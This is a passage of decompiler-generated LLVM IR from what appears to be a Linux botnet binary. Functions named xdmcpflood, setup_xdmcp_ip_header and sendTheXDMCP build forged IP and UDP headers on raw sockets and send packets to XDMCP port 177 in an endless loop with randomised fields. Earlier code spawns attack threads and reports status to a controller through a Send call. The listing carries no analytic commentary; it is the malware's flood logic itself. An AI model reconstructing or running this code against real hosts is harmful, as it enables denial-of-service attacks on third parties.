  store i32 %v2_804ce73, i32* %eax.global-to-local, align 4
  store i32 %v2_804ce73, i32* %stack_var_-76, align 4
  %v1_804ce78 = call i32 @atol(i32 %v2_804ce73)
  %v1_804ce83 = add i32 %arg4, 16
  store i32 %v1_804ce83, i32* %eax.global-to-local, align 4
  %v1_804ce86 = inttoptr i32 %v1_804ce83 to i32*
  %v2_804ce86 = load i32, i32* %v1_804ce86, align 4
  store i32 %v2_804ce86, i32* %eax.global-to-local, align 4
  store i32 %v2_804ce86, i32* %stack_var_-76, align 4
  %v1_804ce8b = call i32 @atol(i32 %v2_804ce86)
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v2_804ceaa = mul i32 %v1_804ce65, 4
  %v1_804ceb0 = add i32 %v2_804ceaa, 30
  %v2_804ceb3 = and i32 %v1_804ceb0, -16
  %v0_804ceb9 = load i32, i32* @esp, align 4
  %v2_804ceb9 = sub i32 %v0_804ceb9, %v2_804ceb3
  %v1_804cec5 = add i32 %v2_804ceb9, 31
  %v2_804cec8 = and i32 %v1_804cec5, -16
  %v1_804ceea = add i32 %arg4, 4
  %v1_804ceed = inttoptr i32 %v1_804ceea to i32*
  %v5_804cf2025 = icmp sgt i32 %v1_804ce65, 0
  store i32 %v1_804ceea, i32* %eax.global-to-local, align 4
  %v2_804ceed26 = load i32, i32* %v1_804ceed, align 4
  br i1 %v5_804cf2025, label %dec_label_pc_804cee7, label %dec_label_pc_804cf22

dec_label_pc_804cee7:                             ; preds = %dec_label_pc_804cee7, %dec_label_pc_804ce5a
  %v1_804cefb = phi i32 [ %v2_804ceb9, %dec_label_pc_804ce5a ], [ %v1_804cf2a.pre, %dec_label_pc_804cee7 ]
  %v2_804ceed28 = phi i32 [ %v2_804ceed26, %dec_label_pc_804ce5a ], [ %v2_804ceed, %dec_label_pc_804cee7 ]
  %storemerge27 = phi i32 [ 0, %dec_label_pc_804ce5a ], [ %v4_804cf17, %dec_label_pc_804cee7 ]
  store i32 %v2_804ceed28, i32* @ecx, align 4
  %v2_804cef5 = mul i32 %storemerge27, 4
  %v2_804cef8 = add i32 %v2_804cef5, %v2_804cec8
  store i32 %v2_804cef8, i32* %eax.global-to-local, align 4
  %v2_804cefb = add i32 %v1_804cefb, 12
  %v3_804cefb = inttoptr i32 %v2_804cefb to i32*
  store i32 %v2_804ceed28, i32* %v3_804cefb, align 4
  %v0_804ceff = load i32, i32* @esp, align 4
  %v1_804ceff = add i32 %v0_804ceff, 8
  %v2_804ceff = inttoptr i32 %v1_804ceff to i32*
  store i32 134531972, i32* %v2_804ceff, align 4
  %v0_804cf07 = load i32, i32* @esp, align 4
  %v1_804cf07 = add i32 %v0_804cf07, 4
  %v2_804cf07 = inttoptr i32 %v1_804cf07 to i32*
  store i32 0, i32* %v2_804cf07, align 4
  %v0_804cf0f = load i32, i32* %eax.global-to-local, align 4
  %v1_804cf0f = load i32, i32* @esp, align 4
  %v2_804cf0f = inttoptr i32 %v1_804cf0f to i32*
  store i32 %v0_804cf0f, i32* %v2_804cf0f, align 4
  %v0_804cf12 = call i32 @pthread_create()
  %v4_804cf17 = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_804ceea, i32* %eax.global-to-local, align 4
  %v2_804ceed = load i32, i32* %v1_804ceed, align 4
  %exitcond = icmp eq i32 %v4_804cf17, %v1_804ce65
  %v1_804cf2a.pre = load i32, i32* @esp, align 4
  br i1 %exitcond, label %dec_label_pc_804cf22, label %dec_label_pc_804cee7

dec_label_pc_804cf22:                             ; preds = %dec_label_pc_804cee7, %dec_label_pc_804ce5a
  %v1_804cf2a = phi i32 [ %v2_804ceb9, %dec_label_pc_804ce5a ], [ %v1_804cf2a.pre, %dec_label_pc_804cee7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804ce5a ], [ %v1_804ce65, %dec_label_pc_804cee7 ]
  %v2_804ceed.lcssa = phi i32 [ %v2_804ceed26, %dec_label_pc_804ce5a ], [ %v2_804ceed, %dec_label_pc_804cee7 ]
  %v2_804cf2a = add i32 %v1_804cf2a, 12
  %v3_804cf2a = inttoptr i32 %v2_804cf2a to i32*
  store i32 %v2_804ceed.lcssa, i32* %v3_804cf2a, align 4
  %v1_804cf31 = load i32, i32* @esp, align 4
  %v2_804cf31 = add i32 %v1_804cf31, 8
  %v3_804cf31 = inttoptr i32 %v2_804cf31 to i32*
  store i32 %arg2, i32* %v3_804cf31, align 4
  %v0_804cf35 = load i32, i32* @esp, align 4
  %v1_804cf35 = add i32 %v0_804cf35, 4
  %v2_804cf35 = inttoptr i32 %v1_804cf35 to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_806a296.121 to i32), i32* %v2_804cf35, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804cf40 = load i32, i32* @esp, align 4
  %v2_804cf40 = inttoptr i32 %v1_804cf40 to i32*
  store i32 %arg1, i32* %v2_804cf40, align 4
  %v1_804cf43 = load i32, i32* %stack_var_-4, align 4
  %v2_804cf43 = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804cf43)
  store i32 %v1_804ce83, i32* %eax.global-to-local, align 4
  %v2_804cf55 = load i32, i32* %v1_804ce86, align 4
  store i32 %v2_804cf55, i32* %eax.global-to-local, align 4
  %v1_804cf57 = load i32, i32* @esp, align 4
  %v2_804cf57 = inttoptr i32 %v1_804cf57 to i32*
  store i32 %v2_804cf55, i32* %v2_804cf57, align 4
  %v1_804cf5a = call i32 @atol(i32 0)
  %v9_804cf5f = mul i32 %v1_804cf5a, 20
  store i32 %v9_804cf5f, i32* %eax.global-to-local, align 4
  %v7_804cf66 = icmp sgt i32 %v9_804cf5f, 0
  br i1 %v7_804cf66, label %dec_label_pc_804cf6c, label %dec_label_pc_804d029

dec_label_pc_804cf6c:                             ; preds = %dec_label_pc_804cf22
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804cf7b = load i32, i32* @esp, align 4
  %v2_804cf7b = inttoptr i32 %v1_804cf7b to i32*
  store i32 50000, i32* %v2_804cf7b, align 4
  %v2_804cf7e = call i32 @usleep(i64 0)
  %v0_804cf83 = load i64, i64* @global_var_807e2e0.88, align 8
  %sext = mul i64 %v0_804cf83, 4294967296
  %v2_804cf8c = sdiv i64 %sext, 4294967296
  %v4_804cf8c = mul nsw i64 %v2_804cf8c, 20
  %v5_804cf8c = trunc i64 %v4_804cf8c to i32
  %tmp33 = icmp ugt i32 %v5_804cf8c, %v1_804ce78
  %v0_804cfbb = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804cfbb, i32* %eax.global-to-local, align 4
  br i1 %tmp33, label %dec_label_pc_804cf96, label %dec_label_pc_804cfbb

dec_label_pc_804cf96:                             ; preds = %dec_label_pc_804cf6c
  %tmp23 = icmp slt i32 %v0_804cfbb, 1
  %tmp24 = icmp eq i1 %tmp23, false
  br i1 %tmp24, label %dec_label_pc_804cfae, label %dec_label_pc_804cf9f

dec_label_pc_804cf9f:                             ; preds = %dec_label_pc_804cf96
  %v0_804cf9f = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804cfa4 = add i32 %v0_804cf9f, 100
  store i32 %v1_804cfa4, i32* %eax.global-to-local, align 4
  store i32 %v1_804cfa4, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804cfe9

dec_label_pc_804cfae:                             ; preds = %dec_label_pc_804cf96
  %v1_804cfb3 = add i32 %v0_804cfbb, -1
  store i32 %v1_804cfb3, i32* %eax.global-to-local, align 4
  store i32 %v1_804cfb3, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804cfe9

dec_label_pc_804cfbb:                             ; preds = %dec_label_pc_804cf6c
  %v1_804cfc0 = add i32 %v0_804cfbb, 1
  store i32 %v1_804cfc0, i32* @global_var_807e1a8.89, align 8
  %v0_804cfc6 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804cfc6, i32* %eax.global-to-local, align 4
  %v1_804cfcb = add i32 %v0_804cfc6, -25
  %v5_804cfcb = icmp ult i32 %v0_804cfc6, 25
  %v9_804cfcb = icmp eq i32 %v1_804cfcb, 0
  %v2_804cfce = or i1 %v5_804cfcb, %v9_804cfcb
  br i1 %v2_804cfce, label %dec_label_pc_804cfdf, label %dec_label_pc_804cfd0

dec_label_pc_804cfd0:                             ; preds = %dec_label_pc_804cfbb
  store i32 %v1_804cfcb, i32* %eax.global-to-local, align 4
  store i32 %v1_804cfcb, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804cfe9

dec_label_pc_804cfdf:                             ; preds = %dec_label_pc_804cfbb
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804cfe9

dec_label_pc_804cfe9:                             ; preds = %dec_label_pc_804cfd0, %dec_label_pc_804cfae, %dec_label_pc_804cf9f, %dec_label_pc_804cfdf
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v5_804d00a = add i32 %v1_804ce8b, %v2_804cde2
  br label %dec_label_pc_804cff3

dec_label_pc_804cff3:                             ; preds = %dec_label_pc_804d024, %dec_label_pc_804cfe9
  %stack_var_-12.0 = phi i32 [ %tmp, %dec_label_pc_804cfe9 ], [ %v4_804d024, %dec_label_pc_804d024 ]
  %v7_804cff7 = icmp sgt i32 %stack_var_-12.0, 99
  br i1 %v7_804cff7, label %dec_label_pc_804cff9, label %dec_label_pc_804d024

dec_label_pc_804cff9:                             ; preds = %dec_label_pc_804cff3
  %v0_804cff9 = load i32, i32* @esp, align 4
  %v1_804cff9 = inttoptr i32 %v0_804cff9 to i32*
  store i32 0, i32* %v1_804cff9, align 4
  %v2_804d000 = call i32 @__GI_time(i32* null)
  store i32 %v5_804d00a, i32* %eax.global-to-local, align 4
  %v7_804d00d = icmp ult i32 %v2_804d000, %v5_804d00a
  br i1 %v7_804d00d, label %dec_label_pc_804d024, label %dec_label_pc_804d011

dec_label_pc_804d011:                             ; preds = %dec_label_pc_804cff9
  %v0_804d011 = load i32, i32* @esp, align 4
  %v1_804d011 = inttoptr i32 %v0_804d011 to i32*
  store i32 0, i32* %v1_804d011, align 4
  %v1_804d018 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804d018, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d024

dec_label_pc_804d024:                             ; preds = %dec_label_pc_804d011, %dec_label_pc_804cff9, %dec_label_pc_804cff3
  %stack_var_-12.1 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804cff3 ], [ 0, %dec_label_pc_804cff9 ], [ 0, %dec_label_pc_804d011 ]
  %v4_804d024 = add i32 %stack_var_-12.1, 1
  br label %dec_label_pc_804cff3

dec_label_pc_804d029:                             ; preds = %dec_label_pc_804cf22
  %v0_804d029 = load i32, i32* @esp, align 4
  %v1_804d029 = inttoptr i32 %v0_804d029 to i32*
  store i32 0, i32* %v1_804d029, align 4
  %v1_804d030 = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804d030, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d035

dec_label_pc_804d035:                             ; preds = %entry, %dec_label_pc_804d029
  %v0_804d039 = phi i32 [ %v1_804cdf0, %entry ], [ %v1_804d030, %dec_label_pc_804d029 ]
  ret i32 %v0_804d039

; uselistorder directives
  uselistorder i32 %v1_804cfcb, { 1, 0, 2 }
  uselistorder i32 %v0_804cfbb, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804cf5f, { 1, 0 }
  uselistorder i32 %v4_804cf17, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_804ceed28, { 1, 0 }
  uselistorder i32* %v1_804ceed, { 1, 0 }
  uselistorder i32 %v1_804ceea, { 2, 0, 1 }
  uselistorder i32 %v4_804ce2e, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 15, 13, 14, 30, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29 }
  uselistorder i32 %arg4, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d035, { 1, 0 }
  uselistorder label %dec_label_pc_804cfe9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ce5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ce2e, { 1, 0 }
}

define i32 @setup_xdmcp_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d03a = load i32, i32* @ebp, align 4
  store i32 %v0_804d03a, i32* %stack_var_-4, align 4
  %v4_804d040 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804d05b = add i32 %v4_804d040, 1
  %v2_804d05b = inttoptr i32 %v1_804d05b to i8*
  store i8 0, i8* %v2_804d05b, align 1
  %v1_804d062 = add i32 %v4_804d040, 2
  %v2_804d062 = inttoptr i32 %v1_804d062 to i16*
  store i16 35, i16* %v2_804d062, align 2
  %v2_804d06f = call i32 @htonl(i32 54321)
  %v1_804d074 = urem i32 %v2_804d06f, 65536
  store i32 %v1_804d074, i32* @edx, align 4
  %v1_804d07a = trunc i32 %v2_804d06f to i16
  %v3_804d07a = add i32 %v4_804d040, 4
  %v4_804d07a = inttoptr i32 %v3_804d07a to i16*
  store i16 %v1_804d07a, i16* %v4_804d07a, align 2
  %v1_804d081 = add i32 %v4_804d040, 6
  %v2_804d081 = inttoptr i32 %v1_804d081 to i16*
  store i16 0, i16* %v2_804d081, align 2
  %v1_804d08a = add i32 %v4_804d040, 8
  %v2_804d08a = inttoptr i32 %v1_804d08a to i8*
  store i8 -1, i8* %v2_804d08a, align 1
  %v1_804d091 = add i32 %v4_804d040, 9
  %v2_804d091 = inttoptr i32 %v1_804d091 to i8*
  store i8 17, i8* %v2_804d091, align 1
  %v1_804d098 = add i32 %v4_804d040, 10
  %v2_804d098 = inttoptr i32 %v1_804d098 to i16*
  store i16 0, i16* %v2_804d098, align 2
  %v2_804d0a5 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8069b65.78 to i32))
  %v3_804d0af = add i32 %v4_804d040, 12
  %v4_804d0af = inttoptr i32 %v3_804d0af to i32*
  store i32 %v2_804d0a5, i32* %v4_804d0af, align 4
  %v2_804d0b2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d0b2, i32* @ebp, align 4
  ret i32 %v4_804d040

; uselistorder directives
  uselistorder i32 %v2_804d06f, { 1, 0 }
}

define i32 @setup_xdmcp_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d0b4 = load i32, i32* @ebp, align 4
  store i32 %v0_804d0b4, i32* %stack_var_-4, align 4
  %v2_804d0c1 = call i32 @htons(i16 5678)
  %v1_804d0c6 = urem i32 %v2_804d0c1, 65536
  store i32 %v1_804d0c6, i32* %edx.global-to-local, align 4
  %v4_804d0c9 = ptrtoint i16* %arg1 to i32
  %v1_804d0cc = trunc i32 %v2_804d0c1 to i16
  store i16 %v1_804d0cc, i16* %arg1, align 2
  %v2_804d0d6 = call i32 @htons(i16 177)
  %v1_804d0e1 = trunc i32 %v2_804d0d6 to i16
  %v3_804d0e1 = add i32 %v4_804d0c9, 2
  %v4_804d0e1 = inttoptr i32 %v3_804d0e1 to i16*
  store i16 %v1_804d0e1, i16* %v4_804d0e1, align 2
  %v1_804d0e8 = add i32 %v4_804d0c9, 6
  %v2_804d0e8 = inttoptr i32 %v1_804d0e8 to i16*
  store i16 0, i16* %v2_804d0e8, align 2
  %v1_804d0f1 = add i32 %v4_804d0c9, 8
  store i32 %v1_804d0f1, i32* %edx.global-to-local, align 4
  %v2_804d0f9 = inttoptr i32 %v1_804d0f1 to i32*
  store i32 33554688, i32* %v2_804d0f9, align 4
  %v2_804d102 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d102 = add i32 %v2_804d102, 4
  %v4_804d102 = inttoptr i32 %v3_804d102 to i16*
  store i16 256, i16* %v4_804d102, align 2
  %v2_804d10d = load i32, i32* %edx.global-to-local, align 4
  %v3_804d10d = add i32 %v2_804d10d, 6
  %v4_804d10d = inttoptr i32 %v3_804d10d to i8*
  store i8 0, i8* %v4_804d10d, align 1
  %v2_804d117 = call i32 @htons(i16 15)
  %v1_804d11c = urem i32 %v2_804d117, 65536
  store i32 %v1_804d11c, i32* %edx.global-to-local, align 4
  %v1_804d122 = trunc i32 %v2_804d117 to i16
  %v4_804d122 = add i32 %v4_804d0c9, 4
  %v5_804d122 = inttoptr i32 %v4_804d122 to i16*
  store i16 %v1_804d122, i16* %v5_804d122, align 2
  %v2_804d126 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d126, i32* @ebp, align 4
  ret i32 %v4_804d0c9

; uselistorder directives
  uselistorder i32 %v2_804d117, { 1, 0 }
  uselistorder i32 %v2_804d0c1, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @xdmcpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4148 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  %v2_804d138 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_804d144 = add i32 %v2_804d138, 20
  %v5_804d147 = inttoptr i32 %v1_804d144 to i16*
  %v1_804d156 = add i32 %arg1, 12
  %v2_804d156 = inttoptr i32 %v1_804d156 to i32*
  %v3_804d156 = load i32, i32* %v2_804d156, align 4
  %v1_804d174 = add i32 %arg1, 4
  %v2_804d174 = inttoptr i32 %v1_804d174 to i32*
  %v3_804d174 = load i32, i32* %v2_804d174, align 4
  %v3_804d191 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804d199 = icmp slt i32 %v3_804d191, 0
  %v1_804d19d = icmp eq i1 %v5_804d199, false
  br i1 %v1_804d19d, label %dec_label_pc_804d1ab, label %dec_label_pc_804d19f

dec_label_pc_804d19f:                             ; preds = %entry
  %v1_804d1a6 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804d1ab

dec_label_pc_804d1ab:                             ; preds = %entry, %dec_label_pc_804d19f
  %v2_804d1b2 = call i32 @__GI_time(i32* null)
  %v1_804d1ba = call i32 @init_rand(i32 %v2_804d1b2)
  %v3_804d1db = bitcast i32* %stack_var_-4128 to i8*
  %v4_804d1db = call i32 @__GI_memset(i8* %v3_804d1db, i32 0, i32 4096)
  %v2_804d1e6 = call i32 @setup_xdmcp_ip_header(i8* %v3_804d1db)
  %v2_804d1f1 = call i32 @setup_xdmcp_udp_header(i16* %v5_804d147)
  %v0_804d1f6 = call i32 @random()
  %v2_804d21e = sdiv i32 %v0_804d1f6, 13107
  store i32 %v2_804d21e, i32* @ebx, align 4
  %tmp26 = mul i32 %v2_804d21e, -65535
  %v2_804d237 = add i32 %tmp26, %v0_804d1f6
  %v1_804d246 = add i32 %v2_804d237, 64510
  %v1_804d251 = trunc i32 %v1_804d246 to i16
  %v2_804d251 = call i32 @htons(i16 %v1_804d251)
  %v1_804d25c = trunc i32 %v2_804d251 to i16
  store i16 %v1_804d25c, i16* %v5_804d147, align 4
  %v2_804d268 = add i32 %v2_804d138, 12
  %v3_804d268 = inttoptr i32 %v2_804d268 to i32*
  store i32 %v3_804d156, i32* %v3_804d268, align 4
  %v1_804d26e = add i32 %v3_804d174, 4
  %v2_804d26e = inttoptr i32 %v1_804d26e to i32*
  %v3_804d26e = load i32, i32* %v2_804d26e, align 4
  %v2_804d274 = add i32 %v2_804d138, 16
  %v3_804d274 = inttoptr i32 %v2_804d274 to i32*
  store i32 %v3_804d26e, i32* %v3_804d274, align 4
  %v1_804d27a = or i32 %v2_804d138, 2
  %v2_804d27a = inttoptr i32 %v1_804d27a to i16*
  %v3_804d27a = load i16, i16* %v2_804d27a, align 2
  %div = udiv i16 %v3_804d27a, 2
  %v2_804d27e = zext i16 %div to i32
  %v2_804d290 = bitcast i32* %stack_var_-4128 to i16*
  %v3_804d290 = call i32 @csum(i16* %v2_804d290, i32 %v2_804d27e)
  %v1_804d29b = trunc i32 %v3_804d290 to i16
  %v3_804d29b = add i32 %v2_804d138, 10
  %v4_804d29b = inttoptr i32 %v3_804d29b to i16*
  store i16 %v1_804d29b, i16* %v4_804d29b, align 2
  store i32 1, i32* %stack_var_-4148, align 4
  %v2_804d2a9 = ptrtoint i32* %stack_var_-4148 to i32
  %v5_804d2d7 = call i32 @__GI_setsockopt(i32 %v3_804d191, i32 0, i32 3, i32 %v2_804d2a9, i32 4)
  %v2_804d2dc = icmp slt i32 %v5_804d2d7, 0
  %v1_804d2de = icmp eq i1 %v2_804d2dc, false
  br i1 %v1_804d2de, label %dec_label_pc_804d2ec, label %dec_label_pc_804d2e0

dec_label_pc_804d2e0:                             ; preds = %dec_label_pc_804d1ab
  %v1_804d2e7 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804d2ec

dec_label_pc_804d2ec:                             ; preds = %dec_label_pc_804d1ab, %dec_label_pc_804d2e0
  %v2_804d2f3 = call i32 @__GI_time(i32* null)
  %v1_804d2fb = call i32 @init_rand(i32 %v2_804d2f3)
  %v3_804d36e = add i32 %v2_804d138, 4
  %v4_804d36e = inttoptr i32 %v3_804d36e to i16*
  br label %dec_label_pc_804d30a

dec_label_pc_804d30a:                             ; preds = %dec_label_pc_804d3c9, %dec_label_pc_804d2ec
  %stack_var_-20.0 = phi i32 [ %v3_804d174, %dec_label_pc_804d2ec ], [ %v3_804d346, %dec_label_pc_804d3c9 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804d2ec ], [ %v4_804d3c9, %dec_label_pc_804d3c9 ]
  %v3_804d312 = load i16, i16* %v2_804d27a, align 2
  %v4_804d312 = zext i16 %v3_804d312 to i32
  %v6_804d33e = call i32 @sendto(i32 %v3_804d191, i32 %v2_804d138, i32 %v4_804d312, i32 0, i32 %stack_var_-20.0, i32 16)
  %v1_804d346 = add i32 %stack_var_-20.0, 532
  %v2_804d346 = inttoptr i32 %v1_804d346 to i32*
  %v3_804d346 = load i32, i32* %v2_804d346, align 4
  %v1_804d352 = add i32 %v3_804d346, 4
  %v2_804d352 = inttoptr i32 %v1_804d352 to i32*
  %v3_804d352 = load i32, i32* %v2_804d352, align 4
  store i32 %v3_804d352, i32* %v3_804d274, align 4
  %v1_804d35b = call i32 @rand_cmwc(i32 %v3_804d346)
  %v1_804d363 = call i32 @htonl(i32 %v1_804d35b)
  %v1_804d36e = trunc i32 %v1_804d363 to i16
  store i16 %v1_804d36e, i16* %v4_804d36e, align 4
  %v3_804d375 = load i16, i16* %v2_804d27a, align 2
  %div27 = udiv i16 %v3_804d375, 2
  %v2_804d379 = zext i16 %div27 to i32
  %v3_804d38b = call i32 @csum(i16* %v2_804d290, i32 %v2_804d379)
  %v1_804d396 = trunc i32 %v3_804d38b to i16
  store i16 %v1_804d396, i16* %v4_804d29b, align 2
  %v0_804d39a = load i64, i64* @global_var_807e2e0.88, align 8
  %v1_804d39a = trunc i64 %v0_804d39a to i32
  %v1_804d39f = add i32 %v1_804d39a, 1
  %v1_804d3a0 = sext i32 %v1_804d39f to i64
  store i64 %v1_804d3a0, i64* @global_var_807e2e0.88, align 32
  %v0_804d3a5 = load i32, i32* @global_var_807e1a8.89, align 8
  %v6_804d3b0 = icmp ugt i32 %v0_804d3a5, %storemerge
  br i1 %v6_804d3b0, label %dec_label_pc_804d3c9, label %dec_label_pc_804d3b2

dec_label_pc_804d3b2:                             ; preds = %dec_label_pc_804d30a
  %v0_804d3bc = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804d3c4 = sext i32 %v0_804d3bc to i64
  %v2_804d3c4 = call i32 @usleep(i64 %v1_804d3c4)
  br label %dec_label_pc_804d3c9

dec_label_pc_804d3c9:                             ; preds = %dec_label_pc_804d30a, %dec_label_pc_804d3b2
  %stack_var_-4156.0 = phi i32 [ %storemerge, %dec_label_pc_804d30a ], [ 0, %dec_label_pc_804d3b2 ]
  %v4_804d3c9 = add i32 %stack_var_-4156.0, 1
  br label %dec_label_pc_804d30a

; uselistorder directives
  uselistorder i32 %v3_804d346, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_804d21e, { 1, 0 }
  uselistorder i32 %v0_804d1f6, { 1, 0 }
  uselistorder i32 %v2_804d138, { 5, 1, 2, 0, 3, 4, 6 }
  uselistorder i32* %stack_var_-4148, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d3c9, { 1, 0 }
  uselistorder label %dec_label_pc_804d2ec, { 1, 0 }
  uselistorder label %dec_label_pc_804d1ab, { 1, 0 }
}

define i32 @sendTheXDMCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1104 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804d3ee = call i32 @mfork(i32 %arg2)
  store i32 %v2_804d3ee, i32* %eax.global-to-local, align 4
  %v1_804d3f3 = icmp eq i32 %v2_804d3ee, 0
  %v1_804d3f5 = icmp eq i1 %v1_804d3f3, false
  br i1 %v1_804d3f5, label %dec_label_pc_804d9c9, label %dec_label_pc_804d3fb

dec_label_pc_804d3fb:                             ; preds = %entry
  %v5_804d412 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_804d412, i32* %eax.global-to-local, align 4
  %v5_804d41a = icmp slt i32 %v5_804d412, 0
  %v1_804d41e = icmp eq i1 %v5_804d41a, false
  br i1 %v1_804d41e, label %dec_label_pc_804d42c, label %dec_label_pc_804d420

dec_label_pc_804d420:                             ; preds = %dec_label_pc_804d3fb
  %v2_804d427 = call i32 @__GI_exit(i32 1)
  store i32 %v2_804d427, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d42c

dec_label_pc_804d42c:                             ; preds = %dec_label_pc_804d3fb, %dec_label_pc_804d420
  %v4_804d42c = add i32 %arg3, -5
  %v9_804d42c = sub i32 4, %arg3
  %v10_804d42c = and i32 %v9_804d42c, %arg3
  %v11_804d42c = icmp slt i32 %v10_804d42c, 0
  %v12_804d42c = icmp eq i32 %v4_804d42c, 0
  %v13_804d42c = icmp slt i32 %v4_804d42c, 0
  %v3_804d430 = icmp eq i1 %v13_804d42c, %v11_804d42c
  %v4_804d430 = icmp eq i1 %v12_804d42c, false
  %v5_804d430 = and i1 %v4_804d430, %v3_804d430
  br i1 %v5_804d430, label %dec_label_pc_804d458, label %dec_label_pc_804d432

dec_label_pc_804d432:                             ; preds = %dec_label_pc_804d42c
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804d447 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_806a2bc.125 to i32))
  store i32 %v3_804d447, i32* %eax.global-to-local, align 4
  %v2_804d453 = call i32 @__GI_exit(i32 1)
  store i32 %v2_804d453, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d458

dec_label_pc_804d458:                             ; preds = %dec_label_pc_804d42c, %dec_label_pc_804d432
  %v3_804d45f = call i32 @__GI_time(i32* null)
  %v1_804d46a = add i32 %arg4, 24
  store i32 %v1_804d46a, i32* %eax.global-to-local, align 4
  %v1_804d46d = inttoptr i32 %v1_804d46a to i32*
  %v2_804d46d = load i32, i32* %v1_804d46d, align 4
  %v1_804d475 = add i32 %arg4, 12
  store i32 %v1_804d475, i32* %eax.global-to-local, align 4
  %v1_804d478 = inttoptr i32 %v1_804d475 to i32*
  %v2_804d478 = load i32, i32* %v1_804d478, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804d485 = and i32 %v2_804d478, -256
  store i32 %v1_804d485, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804d488 = inttoptr i32 %v2_804d478 to i8*
  %v3_804d48e = call i32 @_strlen(i8* %v4_804d488)
  %v4_804d48e = mul i32 %v3_804d48e, -1
  %v5_804d48e = add i32 %v4_804d48e, -2
  store i32 %v5_804d48e, i32* %ecx.global-to-local, align 4
  %v1_804d494 = sub i32 0, %v4_804d48e
  store i32 %v1_804d494, i32* %edx.global-to-local, align 4
  %v2_804d49c = mul i32 %v3_804d48e, 5
  %v1_804d49e = add i32 %v2_804d49c, 160
  store i32 %v1_804d49e, i32* %eax.global-to-local, align 4
  %v4_804d4a6 = add i32 %v2_804d49c, -863
  %v9_804d4a6 = sub i32 862, %v2_804d49c
  %v10_804d4a6 = and i32 %v9_804d4a6, %v1_804d49e
  %v11_804d4a6 = icmp slt i32 %v10_804d4a6, 0
  %v12_804d4a6 = icmp eq i32 %v4_804d4a6, 0
  %v13_804d4a6 = icmp slt i32 %v4_804d4a6, 0
  %v3_804d4ad = icmp eq i1 %v13_804d4a6, %v11_804d4a6
  %v4_804d4ad = icmp eq i1 %v12_804d4a6, false
  %v5_804d4ad = and i1 %v4_804d4ad, %v3_804d4ad
  br i1 %v5_804d4ad, label %dec_label_pc_804d9c9, label %dec_label_pc_804d4b3

dec_label_pc_804d4b3:                             ; preds = %dec_label_pc_804d458
  store i32 %v1_804d475, i32* %eax.global-to-local, align 4
  %v2_804d4b9 = load i32, i32* %v1_804d478, align 4
  store i32 %v2_804d4b9, i32* %edx.global-to-local, align 4
  store i32 %v1_804d475, i32* %eax.global-to-local, align 4
  %v2_804d4c1 = load i32, i32* %v1_804d478, align 4
